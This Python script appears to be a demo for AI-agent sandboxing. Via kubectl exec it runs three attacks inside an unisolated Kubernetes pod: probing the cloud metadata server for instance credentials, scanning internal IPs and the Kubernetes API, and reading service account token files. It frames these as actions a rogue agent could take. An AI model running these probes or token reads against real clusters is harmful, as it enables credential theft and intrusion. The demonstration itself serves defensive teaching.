#!/usr/bin/env python3
"""
Act 1: Attack demonstration on a bare pod (no agent-sandbox).

Runs three attack vectors inside the bare-agent pod via kubectl exec.
All three should SUCCEED, proving the pod has no isolation.

Usage:
  python3 demo/01-attack-script.py
"""

import subprocess
import sys
import textwrap

NAMESPACE = "agent-demo"
POD = "bare-agent"
DIVIDER = "=" * 60


def kexec(python_code: str) -> subprocess.CompletedProcess:
    """Execute a Python one-liner inside the bare pod."""
    return subprocess.run(
        ["kubectl", "exec", "-n", NAMESPACE, POD, "--",
         "python3", "-c", python_code],
        capture_output=True, text=True, timeout=30
    )


def main():
    print(DIVIDER)
    print("  ACT 1: The Threat -- Bare Pod, No Sandbox")
    print(DIVIDER)
    print()

    # --- Attack 1: Cloud metadata server ---
    print("[Attack 1] Cloud metadata server probe (169.254.169.254)")
    print("  An agent could steal cloud instance credentials...")
    print()
    result = kexec(textwrap.dedent("""\
        import urllib.request, urllib.error, socket
        socket.setdefaulttimeout(5)
        try:
            r = urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')
            print(f'STATUS: {r.status}')
            print(f'BODY: {r.read().decode()[:200]}')
        except urllib.error.HTTPError as e:
            print(f'REACHED: HTTP {e.code} (connection reached metadata server)')
        except urllib.error.URLError as e:
            reason = str(e.reason)
            if 'refused' in reason.lower():
                print(f'REACHED: connection refused (network NOT blocked by policy)')
            elif 'timed out' in reason.lower():
                print(f'TIMEOUT: {reason}')
            else:
                print(f'REACHED: {reason}')
        except Exception as e:
            print(f'ERROR: {e}')
    """))
    print(f"  stdout: {result.stdout.strip()}")
    if result.stderr.strip():
        print(f"  stderr: {result.stderr.strip()[:200]}")
    stdout = result.stdout.strip()
    if "REACHED" in stdout or "STATUS:" in stdout:
        status = "REACHABLE (network NOT blocked -- no NetworkPolicy)"
    elif "TIMEOUT" in stdout:
        status = "TIMEOUT (network reachable, but no metadata service)"
    else:
        status = f"UNEXPECTED: {stdout[:100]}"
    print(f"  Result: {status}")
    print()

    # --- Attack 2: Internal network scan ---
    print("[Attack 2] Internal network scan (RFC1918 / cluster services)")
    print("  An agent could probe internal services, databases, other pods...")
    print()
    result = kexec(textwrap.dedent("""\
        import socket
        targets = [
            ('10.0.0.1', 443, 'Internal gateway'),
            ('172.30.0.1', 443, 'K8s API (ClusterIP)'),
        ]
        for ip, port, desc in targets:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            try:
                sock.connect((ip, port))
                print(f'{desc} ({ip}:{port}): CONNECTED')
            except socket.timeout:
                print(f'{desc} ({ip}:{port}): timeout (but NOT blocked by policy)')
            except ConnectionRefusedError:
                print(f'{desc} ({ip}:{port}): refused (host reachable, port closed)')
            except OSError as e:
                print(f'{desc} ({ip}:{port}): {e}')
            finally:
                sock.close()
    """))
    print(f"  stdout: {result.stdout.strip()}")
    print()

    # --- Attack 3: K8s service account token theft ---
    print("[Attack 3] Kubernetes service account token theft")
    print("  An agent could steal the SA token and call the K8s API...")
    print()
    result = kexec(textwrap.dedent("""\
        import os, glob
        token_paths = glob.glob('/var/run/secrets/kubernetes.io/serviceaccount/*')
        if token_paths:
            print(f'Found {len(token_paths)} files:')
            for p in token_paths:
                try:
                    content = open(p).read()
                    preview = content[:80] + '...' if len(content) > 80 else content
                    print(f'  {p}: {preview}')
                except Exception as e:
                    print(f'  {p}: error reading: {e}')
        else:
            print('No service account token found')
    """))
    print(f"  stdout: {result.stdout.strip()}")
    print()

    print(DIVIDER)
    print("  SUMMARY: All attacks succeeded or reached their targets.")
    print("  This is what happens when agents run in standard pods.")
    print(DIVIDER)


if __name__ == "__main__":
    main()
